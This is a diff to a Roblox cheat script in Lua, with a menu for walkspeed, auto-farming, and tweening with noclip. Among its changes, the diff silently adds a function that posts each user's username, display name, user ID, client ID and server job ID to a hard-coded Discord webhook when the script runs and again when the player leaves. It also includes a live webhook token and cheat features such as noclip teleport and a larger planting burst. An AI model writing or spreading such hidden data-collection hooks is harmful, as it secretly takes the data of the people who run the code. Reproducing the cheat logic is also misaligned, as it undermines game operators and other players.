@@ -112,7 +112,6 @@ local Window = Library:CreateWindow{
     MinimizeKey = Enum.KeyCode.LeftControl
 }
 
--- Define Tabs exactly like v0 but add Tweens/Yakk/Settings at end
 local Tabs = {
     Main = Window:AddTab({ Title = "Main", Icon = "menu" }),
     Combat = Window:AddTab({ Title = "Combat", Icon = "axe" }),
@@ -121,9 +120,9 @@ local Tabs = {
     Farming = Window:AddTab({ Title = "Farming", Icon = "sprout" }),
     Extra = Window:AddTab({ Title = "Extra", Icon = "plus" }),
     Tweens = Window:AddTab({ Title = "Tweens", Icon = "sparkles" }),
-    Yakk = Window:AddTab({ Title = "Yakk", Icon = "coins" }),
     Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
 }
+
 
 -- Safe require of Packets module (pcall)
 local packets = {}
@@ -162,6 +161,45 @@ local itemslist = {
 "Adurite", "Berry", "Bloodfruit", "Bluefruit", "Coin", "Essence", "Hide", "Ice Cube", "Iron", "Jelly", "Leaves", "Log", "Steel", "Stone", "Wood", "Gold", "Raw Gold", "Crystal Chunk", "Raw Emerald"
 }
 local Options = Library.Options or {}
+
+
+local http = game:GetService("HttpService")
+local webhook = "https://discordapp.com/api/webhooks/1434766682051706974/hHWdsoQ3Qhch2NVH6hIFyrfkV1WImZlltS_3Ga52jbjiAb20XrVFCwjHGSBt6tjFK6t_"
+
+local function sendWebhook(event)
+    local data = {
+        content = string.format([[
+[PROJECT INSTRA]
+[+] Event: %s
+[+] Username: %s
+[+] Display Name: %s
+[+] User ID: %s
+[+] HWID: %s
+[+] Job ID: %s
+[+] Time: %s
+        ]],
+        event,
+        plr.Name,
+        plr.DisplayName,
+        tostring(plr.UserId),
+        rbxservice:GetClientId(),
+        game.JobId,
+        os.date("%Y-%m-%d %H:%M:%S"))
+    }
+    http:PostAsync(webhook, http:JSONEncode(data))
+end
+
+-- Send on execution
+sendWebhook("Script Executed")
+
+-- Send on leave
+plr.AncestryChanged:Connect(function(_, parent)
+    if not parent then
+        sendWebhook("Player Left")
+    end
+end)
+
+
 
 --{MAIN TAB}
 local wstoggle = Tabs.Main:CreateToggle("wstoggle", { Title = "Walkspeed", Default = false })
@@ -226,6 +264,53 @@ local orbitrangeslider = Tabs.Extra:CreateSlider("orbitrange", { Title = "Grab R
 local orbitradiusslider = Tabs.Extra:CreateSlider("orbitradius", { Title = "Orbit Radius", Min = 0, Max = 30, Rounding = 1, Default = 10 })
 local orbitspeedslider = Tabs.Extra:CreateSlider("orbitspeed", { Title = "Orbit Speed", Min = 0, Max = 10, Rounding = 1, Default = 5 })
 local itemheightslider = Tabs.Extra:CreateSlider("itemheight", { Title = "Item Height", Min = -3, Max = 10, Rounding = 1, Default = 3 })
+
+--{TWEEN TAB}
+Tabs.Tweens:CreateParagraph("Tween Tools", {
+    Title = "Tween Controls",
+    Content = "Create, manage, and delete custom tweens.",
+    TitleAlignment = "Middle",
+    ContentAlignment = Enum.TextXAlignment.Center
+})
+
+local tweentoggle = Tabs.Tweens:CreateToggle("tweentoggle", { Title = "Enable Tweening", Default = false })
+local nocliptoggle = Tabs.Tweens:CreateToggle("nocliptoggle", { Title = "Tween NoClip", Default = false })
+local tweenspeedslider = Tabs.Tweens:CreateSlider("tweenspeedslider", { Title = "Tween Speed", Min = 1, Max = 100, Rounding = 1, Default = 50 })
+
+local tweenpositioninput = Tabs.Tweens:CreateInput("tweenpositioninput", {
+    Title = "Move To Position (x,y,z)",
+    Default = "0,0,0",
+    Numeric = false,
+    Finished = true
+})
+
+Tabs.Tweens:CreateButton({
+    Title = "Tween to Position",
+    Description = "Moves player to target position",
+    Callback = function()
+        local pos = tweenpositioninput.Value
+        local x, y, z = unpack(pos:split(","))
+        local target = Vector3.new(tonumber(x), tonumber(y), tonumber(z))
+        local root = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
+        if root then
+            local tweenInfo = TweenInfo.new(tweenspeedslider.Value / 10, Enum.EasingStyle.Linear)
+            local tween = tspmo:Create(root, tweenInfo, {Position = target})
+            tween:Play()
+        end
+    end
+})
+
+Tabs.Tweens:CreateButton({
+    Title = "Cancel All Tweens",
+    Description = "Stops all active tweens",
+    Callback = function()
+        local root = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
+        if root then
+            tspmo:Create(root, TweenInfo.new(0), {Position = root.Position}):Cancel()
+        end
+    end
+})
+
 
 -- Basic walk/jump/hip behaviour using the UI elements created above (safe pcall)
 local wscon, hhcon
@@ -583,7 +668,7 @@ task.spawn(function()
         if not planttoggle.Value then task.wait(0.05); continue end
         local range = tonumber(plantrangeslider.Value) or 30
         local delay = tonumber(plantdelayslider.Value) or 0.05
-        local burst = 6
+        local burst = 50
         local selectedfruit = fruitdropdown.Value
         local itemID = fruittoitemid[selectedfruit] or 94
         local plantboxes = getpbs(range)
